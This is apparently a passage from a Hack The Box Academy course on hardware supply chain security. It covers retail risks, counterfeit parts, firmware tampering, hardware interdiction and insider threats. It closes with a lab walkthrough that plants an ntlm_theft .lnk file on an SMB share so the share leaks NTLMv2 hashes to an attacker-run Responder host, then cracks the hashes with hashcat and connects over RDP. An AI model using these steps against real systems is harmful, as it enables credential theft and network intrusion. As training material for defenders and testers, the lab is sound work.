Such incidents can erode trust in the brand and the supply chain. Delays or disruptions in the distribution can also cascade sales effects, with potential stock shortages at retail points. In severe cases, if critical infrastructure or safety-dependent sectors receive compromised hardware, the ramifications can be far-reaching and even life-threatening.

### Mitigation Strategies

- Implement robust security measures at storage and distribution hubs, including surveillance, access controls, and regular audits.
- Use `advanced tracking technologies` like GPS and RFID to monitor real-time shipments and ensure their integrity.
- Regularly `update and patch logistics management software` to protect against cyber threats.
- Train logistics personnel on security best practices and the importance of `vigilance during transit and storage`.
- Establish secure and transparent communication channels with all stakeholders in the distribution chain, ensuring rapid response to any potential threats or breaches.

## Retail and Sales

![](https://academy.hackthebox.com/storage/modules/243/Diagram_Hardware-Supply-Chains-01_B_S.png)

The `retail` environment represents the final phase in the hardware supply chain before products reach consumers. As such, it's a crucial touchpoint and one rife with vulnerabilities.

Physical and online retail stores cater to a diverse clientele and often operate in environments where continuous surveillance and tight security controls are challenging to maintain. The vast number of transactions, combined with integrating various payment and inventory systems, introduces numerous potential weak points.

### Types of Attacks

- Introduction of `counterfeit` products into retail inventories.
- `Tampering` with products on display or in storage.
- Cyberattacks targeting `point-of-sale systems` to steal customer payment information.
- Manipulation or hacking of online retail platforms to mislead customers or facilitate `fraudulent` transactions.
- Espionage targeting retail operations to gather insights on sales trends, inventory management, or customer data.

### Consequences

Breaches in the retail and sales phase can lead to many negative outcomes. Direct financial losses can result from fraudulent transactions or the sale of counterfeit products.

For consumers, purchasing tampered or counterfeit hardware can expose them to malfunctions, security vulnerabilities, or physical harm. Additionally, breaches of point-of-sale systems can lead to significant data theft, affecting both consumers and the retailer.

Such incidents can negatively impact brand trust, customer loyalty, and overall sales. Legal actions, regulatory fines, and the costs associated with damage control can further strain businesses.

### Mitigation Strategies

- Employ robust security measures in physical retail environments, including surveillance systems, `tamper-evident displays`, and trained security personnel.
- `Regularly update` and secure point-of-sale systems and online retail platforms against emerging cyber threats.
- Educate retail staff on the importance of security, the risks of counterfeit products, and the protocols to follow in case of suspicious activities.
- Implement `advanced payment authentication methods` for online sales, such as two-factor authentication.
- Collaborate with manufacturers and distributors to ensure the authenticity of products and establish mechanisms for rapid recall or response in case of detected compromises.


# Common Attack Vectors in Supply Chain Attacks

* * *

## Counterfeit Components

Significant focus is directed towards countering software threats and digital intrusions within cybersecurity. However, in the background, counterfeit components represent a dangerous and frequently overlooked risk in the hardware sector.

Due to their tangible nature, counterfeit parts introduce distinct challenges. Often eluding detection by conventional software-focused security measures, these components provide attackers with a clandestine means of system penetration.

### The Nature of Counterfeit Components

The world of counterfeit components is multifaceted and can manifest in various forms:

1. `Substandard Replications`: Counterfeit components, though they might look genuine, are often subpar. This can lead to hardware failures or unforeseen vulnerabilities.
2. `Embedded Malware`: Some of these components can be purposefully embedded with malware to facilitate data breaches or cyber espionage.
3. `System Destabilisation`: Counterfeit parts can introduce instability in the system, leading to unexpected behaviours or total system failure.
4. `Data Leakage Components`: Defined counterfeit components might stealthily transmit sensitive data to remote servers, jeopardising confidentiality.

### The U.S. Department of Defence and Counterfeit Components

In 2010, the U.S. [Department of Defence (DoD) faced a startling revelation](https://a-capp.msu.edu/article/counterfeit-parts-in-the-u-s-department-of-defense-supply-chain/) concerning its supply chain. Over 1 million suspected counterfeit components were identified, opening a Pandora’s box of potential security implications.

One notable case from the early 2000s involved counterfeit helicopter parts. A California man engaged in the sale of counterfeit rubber seals for `H-60A` ( `Black Hawk`) and `H-60` ( `Sea Hawk`) helicopters to various military branches and `NASA`.

These critical parts, which were contractually required to be sourced from a `DoD-approved` supplier in Chicago, were instead purchased cheaply from a Taiwanese company and deceptively mislabeled to appear as if they originated from the approved source. The substandard quality of these parts posed a significant risk of failure, potentially endangering the lives of U.S. military service members.

Another grave concern was the infiltration of counterfeit `integrated circuits (ICs)` intended for use in nuclear submarines. Between 2007 and 2012, a Massachusetts man imported thousands of these counterfeit `ICs` from China and Hong Kong. These components, bearing fake marks from major electronics manufacturers, were sold to the U.S. Navy for use in nuclear submarines.

The perpetrator falsely represented these `ICs` as new products manufactured in Europe. However, testing by the U.S. Navy revealed that the data codes on these `ICs` had been altered to conceal their refurbished status and the counterfeit branding. The individual was convicted in 2014 and sentenced to 37 months in prison, alongside a restitution payment of over $350,000 to the companies whose products he had counterfeited.

The issue also extended to counterfeit computer networking components, as revealed by `Operation Network Raider`, a collaborative effort between `Cisco®` and U.S. law enforcement agencies.

One significant case involved two men from Texas who illegally imported low-cost network cards from China, then fraudulently affixed counterfeit `Cisco®` logos and sold them across the U.S. These counterfeit parts found their way into various federal agencies, including the `Marine Corps`, `Air Force`, `FAA`, `DOE`, `BOP`, and `FBI`, as well as to defence contractors and other institutions.

A similar scheme saw counterfeit `Cisco®` parts intended for use in critical intelligence and security equipment by the `Marine Corps` at a U.S. military base in Iraq. These cases resulted in convictions and prison sentences for the perpetrators involved.

The ramifications of this discovery were multifaceted:

1. `Compromised Defence Systems`: With counterfeit components in critical systems, the reliability and integrity of military equipment and communication systems were potentially at risk.
2. `Operational Failures`: Military operations rely on the seamless function of hardware. Counterfeit parts could lead to equipment malfunctions at crucial moments.
3. `Economic Ramifications`: Addressing the counterfeit component issue requires resources – from identifying and replacing the components to strengthening the procurement process. This translates to considerable economic implications.
4. `Reputational Impact`: Such revelations can tarnish the reputation of defence institutions and erode trust in their capabilities.

Post revelation, the DoD and other stakeholders hastened to rectify the situation. Measures to authenticate and verify components became stringent. Moreover, there was a renewed emphasis on enhancing supplier relationships and adopting secure procurement processes to mitigate future risks.

![FirmwareTampering](https://academy.hackthebox.com/storage/modules/243/FirmwareTampering.png)

## Firmware Tampering

While the realms of software vulnerabilities frequently dominate the headlines in cybersecurity discussions, there lies a more insidious domain: firmware and software tampering at the hardware level. This subtle form of compromise, deeply entrenched within a system's architecture, poses considerable threats, given its capacity to remain undetected by conventional security solutions.

### The Nature of Firmware and Software Tampering

Firmware and software can become vulnerable vectors, particularly when intertwined with hardware. Here's how tampering typically manifests:

1. `Backdoor Insertions`: Attackers embed hidden access mechanisms, granting them clandestine entry into systems, bypassing regular authentication.
2. `Kernel-level Exploits`: Malefactors can gain superior control over the entire system by targeting the system's core or kernel, often subverting traditional security checks.
3. `Bootkit Attacks`: These occur when malicious code is introduced at the boot-up level, ensuring that the malware loads before other system components, rendering detection measures ineffective.
4. `ShadowHammer-like Attacks`: Here, genuine software updates are infiltrated to deliver malicious payloads, subtly introducing vulnerabilities.

### The Thunderstrike 2 and Apple's Firmware

`Thunderstrike 2` emerged as a groundbreaking development in `cybersecurity` when it was revealed in [2015](https://thehackernews.com/2015/08/thunderstrike-mac-firmware-malware.html). This `worm` marked a significant evolution from its predecessor, `Thunderstrike`, by demonstrating the capability to infect `Apple` Macintosh computers remotely without requiring physical access.

The original `Thunderstrike` attack, developed by `Trammell Hudson`, exploited a vulnerability in the `Thunderbolt Option ROM`. This allowed the injection of malicious code into the `Apple Extensible Firmware Interface (EFI)`, but required physical access to the `Mac` computer through an infected `Thunderbolt` device. However, `Thunderstrike 2` transcended this limitation.

Developed by `Trammell Hudson` and `Xeno Kovah` of `Legbacore`, a firmware security consultancy, `Thunderstrike 2` could be delivered through phishing emails, malicious websites, and compromised `USB` or `Ethernet` peripherals. Once downloaded onto a computer, the worm could infect `Thunderbolt-connected` accessories with `Option ROM`. Subsequently, any `Mac` connected to these accessories would be infected.

The insidious nature of `Thunderstrike 2` lies in its ability to target and reside within the `firmware`, making it exceptionally difficult to detect, eliminate, or protect against. Unlike typical `malware` that operates within the operating system, `Thunderstrike 2` resided in the `EFI`, a level so fundamental that it could evade complete system reboots.

`Thunderstrike 2` was not just a threat to `Apple` computers. The vulnerabilities it exploited were found to be common across most `EFI` firmware, affecting PCs from various manufacturers like `Dell`, `HP`, `Lenovo`, `Samsung`, and others. Of the five firmware vulnerabilities that `Thunderstrike 2` exploited on `Mac` computers, `Apple` had fully patched one, partially patched another, and the rest remained unpatched at the time of the discovery.

The emergence of `Thunderstrike 2` underscored several critical cybersecurity concerns:

1. `Remote Execution Capability`: `Thunderstrike 2's` ability to spread remotely represented a significant escalation in the severity of firmware threats.
2. `Persistence and Evasion`: As a firmware-level worm, `Thunderstrike 2` could persist through system reboots and evade traditional antivirus and malware detection methods.
3. `Cross-Platform Vulnerability`: The fact that similar vulnerabilities were present in the `EFI` of multiple manufacturers highlighted a widespread issue in firmware security.

In response to `Thunderstrike 2`, `Apple` and other manufacturers were compelled to address these firmware vulnerabilities. This incident served as a wake-up call, emphasising the need for enhanced security measures at the firmware level and the importance of vigilance against increasingly sophisticated and diverse cybersecurity threats.

## Hardware Interdiction

Much of the focus in cybersecurity centres on software vulnerabilities and digital threats. However, hardware interdiction—where hardware shipments are intercepted, and physical components of a device or system are altered or compromised—presents an equally, if not more, insidious threat.

Due to the tangible nature of the hardware, tampering can be difficult to detect through conventional software-based security measures, making it a potent avenue for attackers.

### The Nature of Hardware Interdiction

Hardware interdiction and subsequent tampering can take multiple forms:

1. `Component Substitution`: Genuine components within a device might be replaced with compromised ones with backdoors or malicious functionalities.
2. `Microchip Alteration`: Advanced adversaries might introduce microchips or alter existing ones to serve malicious purposes. These microchips can be incredibly small and hard to detect.
3. `Firmware Manipulation`: While firmware is software-based, it operates at a hardware level. Attackers might tamper with firmware to introduce vulnerabilities or malicious functionalities.
4. `Peripheral Interference`: Devices connected to the primary system, like keyboards or USB devices, might be tampered with to capture data or introduce malware.

### The NSA and Hardware Interdiction

In 2014, [documents leaked](https://www.infoworld.com/article/2608141/snowden--the-nsa-planted-backdoors-in-cisco-products.html) by whistleblower Edward Snowden suggested that the NSA had a covert program to interdict hardware shipments bound for specific targets.

These shipments, which included routers, servers, and other network gear, were allegedly rerouted to secret NSA facilities. Once there, the devices were purportedly fitted with backdoor surveillance tools before being repackaged and sent to the intended recipients.

The potential consequences and ramifications of such hardware tampering are vast:

1. `Unauthorised Surveillance`: With backdoors implanted directly in the hardware, the NSA could monitor data traffic, gain unauthorised access to networks, and even control the tampered devices.
2. `Trust Erosion`: Revelations like these can erode trust in the global tech supply chain. Organisations and foreign governments might become wary of purchasing tech products from U.S. companies, fearing potential tampering.
3. `Economic Impact`: A loss of trust can have economic implications. If foreign buyers choose to avoid American tech products due to security concerns, it could lead to significant financial losses for U.S. tech companies.
4. `Diplomatic Strain`: Revelations of state-sponsored hardware tampering can strain diplomatic relations, leading to potential political repercussions.

The tech industry responded quickly to the allegations, especially companies implicated in the leaked documents. Many denied any knowledge of or involvement in the NSA's supposed activities.

The revelations also spurred discussions about enhancing hardware integrity and data encryption security measures to safeguard against potential tampering or surveillance by state actors or malicious entities.


# Insider Threats

* * *

In cybersecurity, the term `insider threat` refers to risks posed by individuals within an organisation who have access to critical information and systems. These individuals may be employees, contractors, or business partners, each capable of significantly impacting the integrity and security of the supply chain.

The concept of an `insider threat` in `supply chain security` is multifaceted, covering a range of individuals and motivations. The primary categories are `malicious insiders`, `negligent insiders`, and `infiltrators`, each presenting distinct challenges and risks.

![InsiderThreats](https://academy.hackthebox.com/storage/modules/243/InsiderThreats.png)

## Insider Threats in Supply Chains

The scope of `insider threats` in `supply chains` is particularly concerning, given these individuals' extensive access and influence. An insider in a `supply chain` environment can manipulate data, steal critical `intellectual property`, or introduce systemic vulnerabilities for later exploitation. The interconnected nature of `supply chains` amplifies the impact of these threats. A single compromised element can trigger a domino effect, impacting multiple `supply chain` tiers.

### Malicious Insider

A `malicious insider` is an individual within an organisation who deliberately misuses their authorised access to cause harm to the organisation. This harm can take various forms and is driven by various motivations. Unlike external threats, `malicious insiders` have legitimate access and an intricate understanding of the organisation’s practices, making their actions potentially more damaging and challenging to detect.

- `Data Theft`: This is a prevalent form of malicious insider activity. Insiders accessing `sensitive information` can exfiltrate proprietary data, `customer information`, or `intellectual property`. The implications are severe, ranging from financial losses to eroded competitive advantages.

Typically, these actions are financially motivated, with insiders selling stolen data to competitors or on illicit markets.

- `System Sabotage`: Malicious insiders may sabotage by introducing `malware` into systems, corrupting data, or disabling `critical network infrastructure`. This insider threat is particularly harmful as it can halt entire `supply chain` operations, leading to significant delays, loss of trust, and considerable remediation costs.


​ These actions are often motivated by personal grievances or desires for retribution.

- `Espionage`: Involving the passing of sensitive information to external parties like rival companies or foreign governments, espionage by insiders is usually sophisticated and well-planned. These insiders covertly gather and transmit information over time.

The driving forces can be ideological, aligning with the goals of the external entity, or financial, where the insider receives compensation for their espionage.

- `Compromising Sensitive Information`: Beyond outright theft and sabotage, some malicious insiders may aim to compromise the integrity of `sensitive information`. This could mean altering data to benefit a third party or harm the organisation somehow.

Ideological beliefs often drive these actions, as the insider might aim to advance a specific cause or agenda.


Malicious insiders can be found at any level, from `operational staff` to `upper management`. Their roles and `access levels` provide different means and opportunities to inflict harm. For instance, `technical roles` might allow direct manipulation of `critical systems`, `managerial positions` may offer broad access to `strategic information`, and `operational roles` could enable the disruption of `physical assets` or `supply chain` processes. `External parties`, such as contractors or business partners, can also pose a risk if granted access to the organisation’s `networks` and `data`.

### Negligent Insiders

`Negligent insiders` are individuals within an organisation whose actions, though not malicious in intent, inadvertently lead to security breaches or data loss. These breaches are typically the result of oversight, lack of awareness, or inadequate training. Unlike malicious insiders, negligent insiders do not intend to harm the organisation, but their actions can be just as damaging.

- `Phishing Attack Victims`: One of the most common forms of security breaches involving negligent insiders is falling victim to `phishing attacks`. These scams trick employees into divulging `sensitive information` or credentials, often leading to unauthorised access to organisational systems.

Negligent insiders might click on malicious links or download infected attachments, unknowingly granting attackers access.

- `Unintentional Sharing of Sensitive Information`: Negligent insiders may accidentally share confidential or sensitive data. This could happen through sending documents to the wrong recipient, misconfiguring permissions on shared files, or discussing sensitive topics in unsecured environments.

- `Improper Data Handling`: Mishandling data, such as improper disposal of documents, careless storage of sensitive information, or using unsecured networks for transmitting data, can lead to serious breaches.

These actions often stem from a lack of understanding of security protocols or carelessness.


Negligent insiders can be found across all levels and departments of an organisation. While not intentional, their actions highlight gaps in an organisation’s security training and awareness programs. For instance, an employee in `finance` might accidentally leak `financial data`, or an `IT staff` member could inadvertently install a compromised software update. These scenarios are not limited to any specific role or level of seniority but are instead indicative of broader issues in an organisation’s approach to `cybersecurity`.

### Infiltrators

`Infiltrators` represent a distinct and particularly insidious category of insider threat. These individuals intentionally embed themselves within an organisation with the primary objective of conducting espionage, sabotage, or theft. Unlike negligent or malicious insiders, infiltrators enter the organisation with pre-existing harmful intentions, making their threat more calculated and potentially more damaging.

- `Pre-Meditated Intent`: Infiltrators join an organisation with clear, hostile intentions. Their goal is to cause harm or extract value, often for the benefit of external entities such as competitors, criminal organisations, or foreign state actors.

- `Sophistication and Deception`: These individuals often display a high level of sophistication in their actions. They are adept at evading detection and can effectively blend in with legitimate employees, making their identification challenging. Infiltrators are skilled in understanding and circumventing security measures put in place by the organisation.

- `External Affiliations`: Infiltrators are frequently affiliated with external groups that seek to gain from the downfall or exploitation of the target organisation. This could be for financial gain, competitive advantage, or geopolitical leverage.


The role of infiltrators in an organisation is fundamentally deceptive and harmful. They are often strategically placed or seek employment in areas where they can do the most damage or gather the most valuable information. This could mean targeting departments like `R&D`, `IT`, or `upper management`, where they can access sensitive information or critical systems. Their ability to appear trustworthy and competent employees or partners makes them particularly dangerous, as they can operate undetected over extended periods.

## Impact on Supply Chain Security

The security of `supply chains` is critically vulnerable to `insider threats`, with ramifications that can be both immediate and far-reaching. The nature of supply chain operations, encompassing a wide array of processes, data exchanges, and logistic operations, makes them a prime target for insiders. Understanding the multifaceted impact of these threats is crucial for organisations to appreciate the full extent of potential risks and to devise effective countermeasures.

- `Operational Disruption`: Insider threats can lead to direct operational disruptions, such as halting `production lines`, delaying `shipments`, or compromising the quality of products.

- `Financial Losses`: The financial impact can be profound, ranging from immediate losses due to disruptions to long-term `reputational damage` affecting future business.

- `Data Breaches and Intellectual Property Theft`: Insiders in supply chains have access to a wealth of `sensitive data`, making them capable of executing significant data breaches or `intellectual property theft`.

- `Compromised Safety and Compliance`: In industries where safety and compliance are critical, insider threats can lead to serious violations, potentially putting lives at risk and exposing the company to legal liabilities.


## Mitigating Insider Threats in Supply Chains

Given the significant risks posed by `Insider threats` to `supply chains`, organisations must adopt a `proactive` and `comprehensive approach` to mitigate these threats. This involves implementing strategic measures designed to prevent, detect, and respond to potential insider incidents. By addressing these risks head-on, organisations can safeguard their supply chains against the potentially devastating effects of insider threats, maintaining `operational integrity` and `trust`.

- `Vetting and Monitoring`: Implementing thorough `background checks` is the first line of defence in mitigating insider threats. This process should extend beyond initial hiring and include ongoing monitoring of employees and partners within the supply chain.

Continuous monitoring can involve regular reviews of employee activities and `access patterns`, ensuring that any unusual behaviour is quickly identified and investigated. This vigilance is especially crucial for positions with access to `sensitive data` or `critical infrastructure`. For instance, in the case of an `IT Systems Administrator`, continuous scrutiny of their access to `critical systems` helps promptly detect and address potential security breaches.

- `Training and Awareness`: Regular training programs are essential to inform employees about the latest security protocols and potential insider threat scenarios. These programs should cover the `technical aspects` of security and emphasize the importance of vigilance and reporting `suspicious activities`.

By fostering a culture of security awareness, employees become an active part of the defence strategy, capable of recognising and preventing potential insider incidents.

- `Access Controls`: Implementing strict `access control` measures ensures that employees have access only to the information necessary for their job functions. Segregating access to `sensitive data` and systems can significantly reduce the potential damage from insider actions.

This strategy may involve `role-based access controls`, frequent review of `access privileges`, and implementing `multi-factor authentication` to add layers of security.

- `Collaborative Security Measures`: In today's interconnected supply chains, a siloed approach to security is inadequate. Collaboration among all entities, including `suppliers`, `manufacturers`, and `distributors`, is essential to create a unified front against insider threats. This collaboration can include sharing best practices, conducting joint security audits, and establishing common security standards and protocols.

A collaborative approach ensures the entire supply chain is fortified against insider threats.

- `Incident Response Plans`: A comprehensive `incident response plan` that includes scenarios involving insider threats is critical. This plan should outline the steps during an incident, including `containment strategies`, `investigation procedures`, and `communication protocols`.

A well-defined response plan can significantly reduce the time to react to an insider incident, thereby minimising its impact. Regular drills and simulations can help ensure that all relevant personnel are prepared to execute the plan effectively under real-world conditions.


# Insider Threat Attack

* * *

" `HealthMate`" is a healthcare technology company headquartered in London, founded in the early 2000s. Over the past two decades, it has emerged as a leading `Electronic Health Record` ( `EHR`) solution purveyor.

`HealthMate` prides itself on delivering cutting-edge, secure, user-friendly systems that improve patient care. Its clients include a myriad of healthcare institutions, ranging from small clinics to sprawling hospital networks.

`HealthMate` has partnered with " `MediConnect`," a medical imaging software vendor. The partnership allows `HealthMate`'s `EHR` system to integrate seamlessly with `MediConnect`'s imaging solutions. `HealthMate` trusts `MediConnect` and has extended certain network privileges to them for more accessible collaborative work.

For example, `HealthMate` has provided `MediConnect` access to a shared folder on their system, so `MediConnect` developers can easily share documentation with the `HealthMate` developers.

You, the attacker, initially attempted to target `HealthMate` directly; however, your attempts failed as their staff had received proper training on phishing attacks, and your attempts to breach their network had thus far all failed. After catching news of this new partnership, you thought of attempting to target `MediConnect` instead.

An initial foothold into the `MediConnect` network was achieved through a compelling spear-phishing campaign targeted at `MediConnect`’s HR department. You sent an email disguised as a job application from a prospective software engineer containing a CV loaded with a malicious payload. When the HR personnel opened the CV, a reverse shell was established, giving you access to a machine on `MediConnect`’s internal network.

Going through internal memos sent to the email of the employee whose machine you had access to, you learnt of this shared folder in the `HealthMate` network that was accessible to `MediConnect` employees.

## Enumeration

As per the memo you found, there is a `Development Share` on one of the systems on the network. Using `smbmap` to map the directories on the noted system, we can see a folder named `Development Share`, to which we have `READ` and `WRITE` permissions.

```shell
smbmap -u HTB-student -p "HTB_@cademy_stdnt!" -H 10.129.228.187
[+] IP: 10.129.228.187:445	Name: 10.129.228.187
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Development Share                                 	READ, WRITE
	IPC$                                              	READ ONLY	Remote IPC
	ShareName                                         	NO ACCESS	SMB Share

```

## NTLM Hashes

`NTLMv2`, or `NT LAN Manager version 2`, is an authentication protocol used on networks that rely on `Windows` operating systems. It was developed as an enhanced and more secure replacement for the earlier `NTLM` and `LM` ( `LAN Manager`) protocols, which were found to be susceptible to various cryptographic attacks.

At its core, the protocol utilises a challenge-response mechanism, a cryptographic dance that enables secure communication without transmitting plain-text passwords across the network. This is further bolstered by using cryptographic hashing algorithms like `MD5`, which provide a secure way to verify the integrity of messages exchanged between the client and the server.

To make the protocol resilient against replay attacks—a vulnerability where an attacker intercepts and reuses valid authentication messages— `NTLMv2` incorporates both server and client nonces ( `Numbers Used Once`). These random numbers ensure that each authentication session is unique, thwarting any attempts to reuse intercepted messages for unauthorised access.

As mentioned above, `NTLMv2` utilises a challenge-response mechanism for authentication:

1. `Initialisation`: When a user attempts to access a network resource, the client sends an authentication request to the server. This request includes the username and an `NTLM` flag indicating the client’s capabilities.
2. `Server Challenge`: In response, the server generates a random 8-byte "challenge" (often called a "nonce") and sends it back to the client.
3. `Client Response`: Upon receiving the server challenge, the client combines this with a client-generated nonce. It then computes an `HMAC-MD5` hash of this amalgamation, employing the `NT hash` of the user's password as the key.
4. `Server Validation`: The client sends back a blob containing several pieces of information: the user name, domain name, and the previously computed `HMAC-MD5` hash. This collective data is known as the `NTLMv2 response`.
5. `Session Security`: After successful authentication, additional features like message integrity and confidentiality can be ensured through session keys.

### NTLM Hash Theft

NTLM hash theft refers to capturing NTLM hashes as they transit over a network. This usually occurs during the Windows authentication process when NTLM is in use. These hashes can be cracked to obtain the plaintext password or utilised directly for lateral movement within a network using techniques like Pass-the-Hash.

We can use [ntlm\_theft](https://github.com/Greenwolf/ntlm_theft) to easily generate payloads that we can use in conjunction with [Responder](https://github.com/lgandx/Responder) to capture the NTLM hashes of the system that hosts the `Development Share` folder. `Responder ` is a Python tool that serves as a LLMNR, NBT-NS, and MDNS poisoner. It primarily focuses on implementing a network protocol suite that facilitates identifying and capturing authentication credentials such as usernames and passwords. Essentially, `Responder ` acts as a rogue server on a local network, impersonating commonly used services like SMB, HTTP, FTP, and more.

Generally, the NTLM Hash Theft process works as follows:

1. `Initiating Responder`: You would begin by running the command `sudo responder -I tun0` on your machine. The `-I` flag specifies the interface ( `tun0`) on which Responder listens for incoming name resolution queries.
2. `Listening and Waiting`: Responder listens on the network interface for LLMNR, NBT-NS, or MDNS requests. These requests usually arise when a user tries to access a network resource by its hostname and standard DNS resolution fails.
3. `Upload Payload`: With `Responder` listening, the payload now needs to be uploaded to the target, triggering an appropriate request
4. `Interception and Poisoning`: When a request is captured, `Responder` responds with its IP address, effectively claiming, "Yes, I am the host you are looking for." The querying machine, misled by this, then tries initiating an NTLM authentication session.
5. `Capturing the NTLMv2` Hash: During this NTLM handshake, the querying machine sends its NTLMv2 hash across the network to authenticate itself. Because Responder is impersonating the desired host, this hash is sent directly to it, allowing you to capture it.
6. `Offline Cracking`: With the NTLMv2 hash in hand, you can use hash cracking tools like `Hashcat ` to attempt to crack it, thereby revealing the plaintext password.
7. `Lateral Movement or Escalation`: If the cracking is successful, or if you decide to use the hash directly in a Pass-the-Hash attack, you can access other network resources or even escalate your privileges.

### Initialize Responder

With a general understanding of the steps as outlined above, your first course of action is to initialize `Responder`.

```shell
sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie ([email protected])
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.58]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-VJP4COMY4M4]
    Responder Domain Name      [HBMF.LOCAL]
    Responder DCE-RPC Port     [49742]
[!] Error starting TCP server on port 80, check permissions or other servers running.

[+] Listening for events...

```

### Payloads

With `Responder ` running, next, we grab the `ntlm_theft` package off [Github](https://github.com/Greenwolf/ntlm_theft) and generate our payloads.

```shell
python3 ntlm_theft.py -g all -s 10.10.14.58 -f hack

Created: hack/hack.scf (BROWSE TO FOLDER)
Created: hack/hack-(url).url (BROWSE TO FOLDER)
Created: hack/hack-(icon).url (BROWSE TO FOLDER)
Created: hack/hack.lnk (BROWSE TO FOLDER)
Created: hack/hack.rtf (OPEN)
Created: hack/hack-(stylesheet).xml (OPEN)
Created: hack/hack-(fulldocx).xml (OPEN)
Created: hack/hack.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: hack/hack-(includepicture).docx (OPEN)
Created: hack/hack-(remotetemplate).docx (OPEN)
Created: hack/hack-(frameset).docx (OPEN)
Created: hack/hack-(externalcell).xlsx (OPEN)
Created: hack/hack.wax (OPEN)
Created: hack/hack.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: hack/hack.asx (OPEN)
Created: hack/hack.jnlp (OPEN)
Created: hack/hack.application (DOWNLOAD AND OPEN)
Created: hack/hack.pdf (OPEN AND ALLOW)
Created: hack/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: hack/Autorun.inf (BROWSE TO FOLDER)
Created: hack/desktop.ini (BROWSE TO FOLDER)
Generation Complete.

```

With the generation complete, we can see the list of payloads in the folder name `hack`.

```shell
cd hack && ls

 Autorun.inf                'hack-(frameset).docx'         hack.jnlp                     hack.rtf                 zoom-attack-instructions.txt
 desktop.ini                'hack-(fulldocx).xml'          hack.lnk                      hack.scf
 hack.application            hack.htm                      hack.m3u                     'hack-(stylesheet).xml'
 hack.asx                   'hack-(icon).url'              hack.pdf                     'hack-(url).url'
'hack-(externalcell).xlsx'  'hack-(includepicture).docx'  'hack-(remotetemplate).docx'   hack.wax

```

### Windows Shortcuts

Next, we will leverage a vulnerability in how `Windows` handles shortcut files. You see, the fundamental issue with shortcut files is their capacity to store not just paths to local files but also links to network resources. More specifically, a `.lnk` file can be engineered to include a `UNC` ( `Universal Naming Convention`) path that points to an external, attacker-controlled server rather than a legitimate local or network file.

When a user opens the folder containing the malicious `.lnk` file, `Windows` automatically tries to resolve the shortcut to generate a file icon or preview. This operation necessitates connecting to the resource the shortcut points to. If the `.lnk` file has been crafted to point to an `SMB` server controlled by an attacker, this action will trigger the `Windows` machine to attempt an `NTLM` authentication.

The `hack.lnk` is set to load a resource from our system, and we will use `Responder` to capture the `NTLM` hashes as the target `Windows` system attempts to load the resource from our system.

Using `smbclient`, we will upload the `hack.lnk` file into the `Development Share` folder, and then when a user on the target system browses the `Development Share` folder, we will capture their `NTLM Hashes`.

```shell
smbclient "//10.129.228.187/Development Share" -U "HTB-student" --password="HTB_@cademy_stdnt!" -c "put hack.lnk"

putting file hack.lnk as \hack.lnk (72.9 kb/s) (average 72.9 kb/s)

```

As expected, as soon as someone opens the folder, we get the hashes.

![](https://academy.hackthebox.com/storage/modules/243/hashes.png)

## Cracking the hashes

Now that we have the hashes, we can crack the password for `WIN-41LARS8U72P\Administrator`. Paste the hash into a new file and then fire up `hashcat` using the `rockyou wordlist`.

```shell
echo "Administrator::WIN-41LARS8U72P:0b68568ed3fcaf11:CC1C7F08BECB0234AA98B9...SNIP,,," >> hash

hashcat -m 5600 -a 0 hash /usr/share/wordlists/rockyou.txt -O
hashcat (v6.1.1) starting...

...

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

Administrator::WIN-41LARS8U72P:0b68568ed3fcaf11:CC1C7F08BECB0234AA98B9...SNIP...:chris...SNIP...

Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: ADMINISTRATOR::WIN-41LARS8U72P:0b68568ed3fcaf11:cc1...000000
Time.Started.....: Mon Oct 30 12:04:28 2023 (0 secs)
Time.Estimated...: Mon Oct 30 12:04:28 2023 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    61895 H/s (3.01ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 4096/14344385 (0.03%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 2048/14344385 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: slimshady -> oooooo

Started: Mon Oct 30 12:03:51 2023
Stopped: Mon Oct 30 12:04:29 2023

```

Just a note that the cracked password in hashcat is the line above the sesssion information, IE the cracked password starts with \`chris....\`

## Lateral Movement

With the password for `Administrator` in hand, we can now RDP into the system using an RDP client such as `Remmina` and move further into the network, opening the door for further exploitation and attacks.

![](https://academy.hackthebox.com/storage/modules/243/remmina.png)

![](https://academy.hackthebox.com/storage/modules/243/rdp.png)

## Mitigations

To thwart the possibility of a supply chain attack stemming from the partnership with MediConnect, HealthMate could have employed a multitude of safeguards, both technical and organisational.

